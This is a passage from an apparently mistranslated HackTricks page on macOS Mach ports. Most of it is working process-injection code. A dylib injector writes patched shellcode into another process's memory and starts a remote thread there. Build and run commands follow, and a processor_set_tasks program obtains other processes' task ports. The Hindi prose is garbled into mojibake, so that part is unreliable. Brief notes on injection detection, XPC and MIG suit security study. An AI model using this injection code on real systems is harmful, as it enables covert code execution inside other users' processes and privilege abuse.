kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдПрдХ рдереНрд░реЗрдб рдХреЛ рд╣рд╛рдИрдЬреИрдХ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Task Port Injection Detection

рдЬрдм `task_for_pid` рдпрд╛ `thread_create_*` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХрд░реНрдиреЗрд▓ рд╕реЗ рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдЯрд╛рд╕реНрдХ рдореЗрдВ рдПрдХ рдХрд╛рдЙрдВрдЯрд░ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдпреВрдЬрд░ рдореЛрдб рд╕реЗ `task_info(task, TASK_EXTMOD_INFO, ...)` рдХреЙрд▓ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## Exception Ports

рдЬрдм рдПрдХ рдереНрд░реЗрдб рдореЗрдВ рдХреЛрдИ рдЕрдкрд╡рд╛рдж рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрдкрд╡рд╛рдж рдереНрд░реЗрдб рдХреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЕрдкрд╡рд╛рдж рдкреЛрд░реНрдЯ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдереНрд░реЗрдб рдЗрд╕реЗ рд╕рдВрднрд╛рд▓ рдирд╣реАрдВ рдкрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рдЯрд╛рд╕реНрдХ рдЕрдкрд╡рд╛рдж рдкреЛрд░реНрдЯ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЯрд╛рд╕реНрдХ рдЗрд╕реЗ рд╕рдВрднрд╛рд▓ рдирд╣реАрдВ рдкрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рд╣реЛрд╕реНрдЯ рдкреЛрд░реНрдЯ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ launchd рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬрд╣рд╛рдВ рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред рдЗрд╕реЗ рдЕрдкрд╡рд╛рдж рдЯреНрд░рд╛рдпреЗрдЬ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЕрдВрдд рдореЗрдВ, рдпрджрд┐ рдЗрд╕реЗ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рд╕рдВрднрд╛рд▓рд╛ рдирд╣реАрдВ рдЧрдпрд╛, рддреЛ рд░рд┐рдкреЛрд░реНрдЯ рдХреЛ ReportCrash рдбреЗрдорди рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд╣реА рдЯрд╛рд╕реНрдХ рдореЗрдВ рджреВрд╕рд░реЗ рдереНрд░реЗрдб рдХреЗ рд▓рд┐рдП рдЕрдкрд╡рд╛рдж рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдпрд╣реА рд╡рд╣ рд╣реИ рдЬреЛ рдХреНрд░реИрд╢ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдЯреВрд▓ рдЬреИрд╕реЗ `PLCreashReporter` рдХрд░рддрд╛ рд╣реИред

## Other Objects

### Clock

рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдШрдбрд╝реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рдордп рд╕реЗрдЯ рдХрд░рдиреЗ рдпрд╛ рдЕрдиреНрдп рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░реВрдЯ рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `clock` рд╕рдмрд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреИрд╕реЗ: `clock_get_time`, `clock_get_attributtes` рдпрд╛ `clock_alarm`\
рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `clock_priv` рд╕рдмрд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ `clock_set_time` рдФрд░ `clock_set_attributes`ред

### Processors and Processor Set

рдкреНрд░реЛрд╕реЗрд╕рд░ рдПрдкреАрдЖрдИ рдПрдХрд▓ рд▓реЙрдЬрд┐рдХрд▓ рдкреНрд░реЛрд╕реЗрд╕рд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХрд░рдХреЗ рдЬреИрд╕реЗ `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ** рдПрдкреАрдЖрдИ рдХрдИ рдкреНрд░реЛрд╕реЗрд╕рд░ рдХреЛ рдПрдХ рд╕рдореВрд╣ рдореЗрдВ рд╕рдореВрд╣рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`processor_set_default`** рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред\
рдпреЗ рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдПрдкреАрдЖрдИ рд╣реИрдВ:

* `processor_set_statistics`
* `processor_set_tasks`: рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдПрдХ рдПрд░реЗ рд▓реМрдЯрд╛рддрд╛ рд╣реИ
* `processor_set_threads`: рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдереНрд░реЗрдбреНрд╕ рдХреЗ рд▓рд┐рдП рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдПрдХ рдПрд░реЗ рд▓реМрдЯрд╛рддрд╛ рд╣реИ
* `processor_set_stack_usage`
* `processor_set_info`

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЕрддреАрдд рдореЗрдВ, рдпрд╣ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ рддрд╛рдХрд┐ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ **`processor_set_tasks`** рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рд╣рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдПрдХ рд╣реЛрд╕реНрдЯ рдкреЛрд░реНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рдЖрдЬрдХрд▓, рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдХреЗрд╡рд▓ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдкрд░ рдЗрди рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВрдЧреЗред

рдЖрдк рдЗрд╕реЗ рдЗрд╕ рддрд░рд╣ рдЖрдЬрдорд╛ рд╕рдХрддреЗ рд╣реИрдВ:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
